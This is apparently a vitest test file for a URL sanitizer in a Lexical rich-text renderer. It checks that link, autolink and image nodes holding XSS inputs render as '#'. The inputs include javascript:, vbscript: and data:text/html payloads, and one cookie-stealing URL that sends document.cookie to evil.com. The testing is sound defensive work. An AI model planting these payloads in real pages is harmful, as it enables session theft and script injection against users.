/**
 * URL Sanitization Tests for the Lexical RSC Renderer
 *
 * Verifies that isSafeUrl() and sanitizeUrl() properly block XSS vectors
 * (javascript:, vbscript:, data:text/html) while allowing safe URLs
 * (http/https, mailto, tel, relative paths, anchors, data:image for images).
 *
 * Also tests end-to-end by building Lexical JSON payloads with malicious
 * link/image nodes and verifying they are sanitized in the rendered React
 * element tree.
 */

import type { SerializedEditorState } from 'lexical';
import type { ReactElement } from 'react';
import { describe, expect, it } from 'vitest';

import { isSafeUrl, sanitizeUrl, serializeLexicalState } from '../exports/server/rsc.js';

// ============================================
// HELPERS: Build Lexical JSON payloads
// ============================================

function textNode(text: string) {
  return { type: 'text', text, format: 0, version: 1 };
}

function linkState(url: string, newTab = false): SerializedEditorState {
  return {
    root: {
      type: 'root',
      version: 1,
      children: [
        {
          type: 'paragraph',
          version: 1,
          children: [
            {
              type: 'link',
              version: 1,
              children: [textNode('click me')],
              fields: { url, linkType: 'custom', newTab },
            },
          ],
        },
      ],
    },
  } as unknown as SerializedEditorState;
}

function autolinkState(url: string): SerializedEditorState {
  return {
    root: {
      type: 'root',
      version: 1,
      children: [
        {
          type: 'paragraph',
          version: 1,
          children: [
            {
              type: 'autolink',
              version: 1,
              url,
              children: [textNode(url)],
            },
          ],
        },
      ],
    },
  } as unknown as SerializedEditorState;
}

function imageState(src: string): SerializedEditorState {
  return {
    root: {
      type: 'root',
      version: 1,
      children: [
        {
          type: 'image',
          version: 1,
          fields: { src, alt: 'test image', width: 100, height: 100 },
        },
      ],
    },
  } as unknown as SerializedEditorState;
}

// ============================================
// React element tree inspection helpers
// ============================================

/**
 * Recursively find all React elements of a given type in the tree.
 * Returns an array of matching elements with their props.
 */
function findElements(element: ReactElement | null, tagName: string): ReactElement[] {
  if (!element) return [];

  const results: ReactElement[] = [];

  if (element.type === tagName) {
    results.push(element);
  }

  // Traverse children
  const children = element.props?.children;
  if (children) {
    if (Array.isArray(children)) {
      for (const child of children) {
        if (child && typeof child === 'object' && 'type' in child) {
          results.push(...findElements(child as ReactElement, tagName));
        }
      }
    } else if (typeof children === 'object' && 'type' in children) {
      results.push(...findElements(children as ReactElement, tagName));
    }
  }

  return results;
}

/**
 * Find the first <a> element's href in the rendered Lexical state.
 */
function findLinkHref(state: SerializedEditorState): string | undefined {
  const element = serializeLexicalState(state);
  const anchors = findElements(element as ReactElement, 'a');
  return anchors[0]?.props?.href;
}

/**
 * Find the first <img> element's src in the rendered Lexical state.
 */
function findImageSrc(state: SerializedEditorState): string | undefined {
  const element = serializeLexicalState(state);
  const figures = findElements(element as ReactElement, 'figure');
  if (figures.length > 0) {
    const imgs = findElements(figures[0], 'img');
    return imgs[0]?.props?.src;
  }
  // Also try finding <img> directly
  const imgs = findElements(element as ReactElement, 'img');
  return imgs[0]?.props?.src;
}

/**
 * Find all <a> element hrefs in the rendered Lexical state.
 */
function findAllLinkHrefs(state: SerializedEditorState): string[] {
  const element = serializeLexicalState(state);
  const anchors = findElements(element as ReactElement, 'a');
  return anchors.map((a) => a.props?.href).filter(Boolean);
}

// ============================================
// UNIT TESTS: isSafeUrl()
// ============================================

describe('isSafeUrl()', () => {
  describe('XSS prevention  -  javascript: protocol', () => {
    it('blocks javascript: links', () => {
      expect(isSafeUrl('javascript:alert(1)')).toBe(false);
    });

    it('blocks javascript: with expression', () => {
      expect(isSafeUrl('javascript:void(0)')).toBe(false);
    });

    it('blocks javascript: with document.cookie theft', () => {
      expect(isSafeUrl('javascript:document.location="http://evil.com/?c="+document.cookie')).toBe(
        false,
      );
    });
  });

  describe('XSS prevention  -  vbscript: protocol', () => {
    it('blocks vbscript: links', () => {
      expect(isSafeUrl('vbscript:MsgBox("XSS")')).toBe(false);
    });

    it('blocks vbscript: with mixed case', () => {
      expect(isSafeUrl('VBScript:MsgBox("XSS")')).toBe(false);
    });
  });

  describe('XSS prevention  -  data: protocol', () => {
    it('blocks data:text/html links', () => {
      expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('blocks data:text/html;base64 links', () => {
      expect(isSafeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe(false);
    });

    it('blocks data:application/javascript links', () => {
      expect(isSafeUrl('data:application/javascript,alert(1)')).toBe(false);
    });

    it('blocks data: without MIME type', () => {
      expect(isSafeUrl('data:,alert(1)')).toBe(false);
    });
  });

  describe('case insensitivity', () => {
    it('blocks JAVASCRIPT: (all caps)', () => {
      expect(isSafeUrl('JAVASCRIPT:alert(1)')).toBe(false);
    });

    it('blocks JavaScript: (mixed case)', () => {
      expect(isSafeUrl('JavaScript:alert(1)')).toBe(false);
    });

    it('blocks jAvAsCrIpT: (alternating case)', () => {
      expect(isSafeUrl('jAvAsCrIpT:alert(1)')).toBe(false);
    });

    it('blocks VBSCRIPT: (all caps)', () => {
      expect(isSafeUrl('VBSCRIPT:MsgBox("XSS")')).toBe(false);
    });

    it('blocks DATA:text/html (all caps prefix)', () => {
      expect(isSafeUrl('DATA:text/html,<script>alert(1)</script>')).toBe(false);
    });
  });

  describe('whitespace tricks', () => {
    it('blocks " javascript:" (leading space)', () => {
      expect(isSafeUrl(' javascript:alert(1)')).toBe(false);
    });

    it('blocks "  javascript:" (multiple leading spaces)', () => {
      expect(isSafeUrl('  javascript:alert(1)')).toBe(false);
    });

    it('blocks "\\tjavascript:" (leading tab)', () => {
      expect(isSafeUrl('\tjavascript:alert(1)')).toBe(false);
    });

    it('blocks "\\njavascript:" (leading newline)', () => {
      expect(isSafeUrl('\njavascript:alert(1)')).toBe(false);
    });

    it('blocks " \\t\\n javascript:" (mixed whitespace)', () => {
      expect(isSafeUrl(' \t\n javascript:alert(1)')).toBe(false);
    });

    it('blocks leading whitespace on vbscript:', () => {
      expect(isSafeUrl('  vbscript:alert(1)')).toBe(false);
    });

    it('blocks leading whitespace on data:', () => {
      expect(isSafeUrl(' data:text/html,<script>alert(1)</script>')).toBe(false);
    });
  });

  describe('safe URLs  -  allowed protocols', () => {
    it('allows http:// URLs', () => {
      expect(isSafeUrl('http://example.com')).toBe(true);
    });

    it('allows https:// URLs', () => {
      expect(isSafeUrl('https://example.com/page?q=1&r=2')).toBe(true);
    });

    it('allows mailto: URLs', () => {
      expect(isSafeUrl('mailto:user@example.com')).toBe(true);
    });

    it('allows tel: URLs', () => {
      expect(isSafeUrl('tel:+1-555-123-4567')).toBe(true);
    });
  });

  describe('safe URLs  -  relative paths and anchors', () => {
    it('allows relative paths', () => {
      expect(isSafeUrl('/about')).toBe(true);
    });

    it('allows relative paths with segments', () => {
      expect(isSafeUrl('/docs/getting-started')).toBe(true);
    });

    it('allows anchor-only links', () => {
      expect(isSafeUrl('#section-1')).toBe(true);
    });

    it('allows bare fragment "#"', () => {
      expect(isSafeUrl('#')).toBe(true);
    });

    it('allows bare slash "/"', () => {
      expect(isSafeUrl('/')).toBe(true);
    });

    it('allows relative path without leading slash', () => {
      expect(isSafeUrl('about/team')).toBe(true);
    });

    it('allows relative path with query params', () => {
      expect(isSafeUrl('/search?q=hello')).toBe(true);
    });
  });

  describe('edge cases', () => {
    it('allows empty string', () => {
      expect(isSafeUrl('')).toBe(true);
    });

    it('allows whitespace-only string (trims to empty)', () => {
      expect(isSafeUrl('   ')).toBe(true);
    });

    it('blocks unknown protocols like ftp:', () => {
      expect(isSafeUrl('ftp://files.example.com/doc.pdf')).toBe(false);
    });

    it('blocks custom protocols like myapp:', () => {
      expect(isSafeUrl('myapp://deep-link')).toBe(false);
    });

    it('allows URLs with port numbers', () => {
      expect(isSafeUrl('https://localhost:3000/api')).toBe(true);
    });

    it('allows URLs with userinfo (though unusual)', () => {
      expect(isSafeUrl('https://user:pass@example.com')).toBe(true);
    });

    it('allows URLs with fragment', () => {
      expect(isSafeUrl('https://example.com/page#section')).toBe(true);
    });
  });

  describe('image context  -  data:image/ URIs', () => {
    it('allows data:image/png;base64 for images', () => {
      expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', 'image')).toBe(true);
    });

    it('allows data:image/jpeg;base64 for images', () => {
      expect(isSafeUrl('data:image/jpeg;base64,/9j/4AAQ=', 'image')).toBe(true);
    });

    it('allows data:image/gif;base64 for images', () => {
      expect(isSafeUrl('data:image/gif;base64,R0lGODlh', 'image')).toBe(true);
    });

    it('allows data:image/svg+xml for images', () => {
      expect(isSafeUrl('data:image/svg+xml;base64,PHN2Zz4=', 'image')).toBe(true);
    });

    it('allows data:image/webp;base64 for images', () => {
      expect(isSafeUrl('data:image/webp;base64,UklGR', 'image')).toBe(true);
    });

    it('blocks data:image/png in link context', () => {
      expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', 'link')).toBe(false);
    });

    it('blocks data:text/html in image context', () => {
      expect(isSafeUrl('data:text/html,<script>alert(1)</script>', 'image')).toBe(false);
    });

    it('blocks javascript: in image context', () => {
      expect(isSafeUrl('javascript:alert(1)', 'image')).toBe(false);
    });

    it('allows https:// URLs in image context', () => {
      expect(isSafeUrl('https://cdn.example.com/photo.jpg', 'image')).toBe(true);
    });

    it('allows relative paths in image context', () => {
      expect(isSafeUrl('/images/photo.jpg', 'image')).toBe(true);
    });
  });
});

// ============================================
// UNIT TESTS: sanitizeUrl()
// ============================================

describe('sanitizeUrl()', () => {
  it('returns the URL unchanged when safe', () => {
    expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
  });

  it('returns "#" for javascript: URLs', () => {
    expect(sanitizeUrl('javascript:alert(1)')).toBe('#');
  });

  it('returns "#" for vbscript: URLs', () => {
    expect(sanitizeUrl('vbscript:alert(1)')).toBe('#');
  });

  it('returns "#" for data:text/html URLs', () => {
    expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('#');
  });

  it('trims whitespace from safe URLs', () => {
    expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
  });

  it('returns "#" for leading-whitespace javascript:', () => {
    expect(sanitizeUrl(' javascript:alert(1)')).toBe('#');
  });

  it('allows data:image/ in image context', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
    expect(sanitizeUrl(dataUri, 'image')).toBe(dataUri);
  });

  it('returns "#" for data:image/ in link context', () => {
    expect(sanitizeUrl('data:image/png;base64,iVBORw0KGgo=', 'link')).toBe('#');
  });
});

// ============================================
// INTEGRATION TESTS: serializeLexicalState()
// rendering with URL sanitization
// ============================================

describe('serializeLexicalState()  -  URL sanitization in rendered output', () => {
  describe('link nodes', () => {
    it('renders safe https link with correct href', () => {
      const href = findLinkHref(linkState('https://example.com'));
      expect(href).toBe('https://example.com');
    });

    it('renders safe relative link', () => {
      const href = findLinkHref(linkState('/about'));
      expect(href).toBe('/about');
    });

    it('renders safe mailto link', () => {
      const href = findLinkHref(linkState('mailto:test@example.com'));
      expect(href).toBe('mailto:test@example.com');
    });

    it('renders safe tel link', () => {
      const href = findLinkHref(linkState('tel:+15551234567'));
      expect(href).toBe('tel:+15551234567');
    });

    it('sanitizes javascript: link to href="#"', () => {
      const href = findLinkHref(linkState('javascript:alert(document.cookie)'));
      expect(href).toBe('#');
    });

    it('sanitizes JAVASCRIPT: link (case insensitive)', () => {
      const href = findLinkHref(linkState('JAVASCRIPT:alert(1)'));
      expect(href).toBe('#');
    });

    it('sanitizes vbscript: link to href="#"', () => {
      const href = findLinkHref(linkState('vbscript:MsgBox("XSS")'));
      expect(href).toBe('#');
    });

    it('sanitizes data:text/html link to href="#"', () => {
      const href = findLinkHref(linkState('data:text/html,<script>alert(1)</script>'));
      expect(href).toBe('#');
    });

    it('sanitizes whitespace-prefixed javascript: link', () => {
      const href = findLinkHref(linkState(' javascript:alert(1)'));
      expect(href).toBe('#');
    });

    it('renders link with no url as href="#"', () => {
      const state = {
        root: {
          type: 'root',
          version: 1,
          children: [
            {
              type: 'paragraph',
              version: 1,
              children: [
                {
                  type: 'link',
                  version: 1,
                  children: [textNode('orphan link')],
                  fields: { linkType: 'custom' },
                },
              ],
            },
          ],
        },
      } as unknown as SerializedEditorState;
      const href = findLinkHref(state);
      expect(href).toBe('#');
    });

    it('renders newTab link with target and rel attributes', () => {
      const element = serializeLexicalState(linkState('https://example.com', true));
      const anchors = findElements(element as ReactElement, 'a');
      expect(anchors[0]?.props?.target).toBe('_blank');
      expect(anchors[0]?.props?.rel).toBe('noopener noreferrer');
    });
  });

  describe('autolink nodes', () => {
    it('renders safe autolink with correct href', () => {
      const href = findLinkHref(autolinkState('https://example.com'));
      expect(href).toBe('https://example.com');
    });

    it('sanitizes javascript: autolink to href="#"', () => {
      const href = findLinkHref(autolinkState('javascript:alert(1)'));
      expect(href).toBe('#');
    });

    it('sanitizes data:text/html autolink', () => {
      const href = findLinkHref(autolinkState('data:text/html,<img onerror=alert(1)>'));
      expect(href).toBe('#');
    });

    it('sanitizes vbscript: autolink', () => {
      const href = findLinkHref(autolinkState('vbscript:alert(1)'));
      expect(href).toBe('#');
    });

    it('renders autolink with no url as href="#"', () => {
      const state = {
        root: {
          type: 'root',
          version: 1,
          children: [
            {
              type: 'paragraph',
              version: 1,
              children: [
                {
                  type: 'autolink',
                  version: 1,
                  children: [textNode('link text')],
                },
              ],
            },
          ],
        },
      } as unknown as SerializedEditorState;
      const href = findLinkHref(state);
      expect(href).toBe('#');
    });
  });

  describe('image nodes', () => {
    it('renders safe https image src', () => {
      const src = findImageSrc(imageState('https://cdn.example.com/photo.jpg'));
      expect(src).toBe('https://cdn.example.com/photo.jpg');
    });

    it('renders safe relative image src', () => {
      const src = findImageSrc(imageState('/images/photo.jpg'));
      expect(src).toBe('/images/photo.jpg');
    });

    it('allows data:image/png base64 in image src', () => {
      const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
      const src = findImageSrc(imageState(dataUri));
      expect(src).toBe(dataUri);
    });

    it('allows data:image/jpeg base64 in image src', () => {
      const dataUri = 'data:image/jpeg;base64,/9j/4AAQ=';
      const src = findImageSrc(imageState(dataUri));
      expect(src).toBe(dataUri);
    });

    it('allows data:image/svg+xml base64 in image src', () => {
      const dataUri = 'data:image/svg+xml;base64,PHN2Zz4=';
      const src = findImageSrc(imageState(dataUri));
      expect(src).toBe(dataUri);
    });

    it('blocks data:text/html in image src', () => {
      const src = findImageSrc(imageState('data:text/html,<script>alert(1)</script>'));
      expect(src).toBe('#');
    });

    it('blocks javascript: in image src', () => {
      const src = findImageSrc(imageState('javascript:alert(1)'));
      expect(src).toBe('#');
    });

    it('blocks vbscript: in image src', () => {
      const src = findImageSrc(imageState('vbscript:alert(1)'));
      expect(src).toBe('#');
    });

    it('renders image with no src as empty string (safe)', () => {
      const state = {
        root: {
          type: 'root',
          version: 1,
          children: [
            {
              type: 'image',
              version: 1,
              fields: { alt: 'broken' },
            },
          ],
        },
      } as unknown as SerializedEditorState;
      const src = findImageSrc(state);
      // Empty string is safe (isSafeUrl returns true for empty), so src=""
      expect(src).toBe('');
    });
  });

  describe('multiple malicious nodes in one document', () => {
    it('sanitizes all malicious links in a multi-node document', () => {
      const state = {
        root: {
          type: 'root',
          version: 1,
          children: [
            {
              type: 'paragraph',
              version: 1,
              children: [
                {
                  type: 'link',
                  version: 1,
                  children: [textNode('xss link 1')],
                  fields: { url: 'javascript:alert(1)', linkType: 'custom' },
                },
                textNode(' safe text '),
                {
                  type: 'link',
                  version: 1,
                  children: [textNode('safe link')],
                  fields: { url: 'https://example.com', linkType: 'custom' },
                },
                textNode(' more text '),
                {
                  type: 'autolink',
                  version: 1,
                  url: 'vbscript:alert(1)',
                  children: [textNode('xss autolink')],
                },
              ],
            },
            {
              type: 'image',
              version: 1,
              fields: { src: 'data:text/html,<script>alert(1)</script>', alt: 'xss image' },
            },
          ],
        },
      } as unknown as SerializedEditorState;

      const hrefs = findAllLinkHrefs(state);
      const imgSrc = findImageSrc(state);

      // First link (javascript:) should be sanitized
      expect(hrefs[0]).toBe('#');
      // Second link (https://) should be preserved
      expect(hrefs[1]).toBe('https://example.com');
      // Third link (vbscript: autolink) should be sanitized
      expect(hrefs[2]).toBe('#');
      // Image (data:text/html) should be sanitized
      expect(imgSrc).toBe('#');

      // Verify no malicious URLs leaked through
      for (const href of hrefs) {
        expect(href).not.toContain('javascript:');
        expect(href).not.toContain('vbscript:');
      }
    });
  });
});
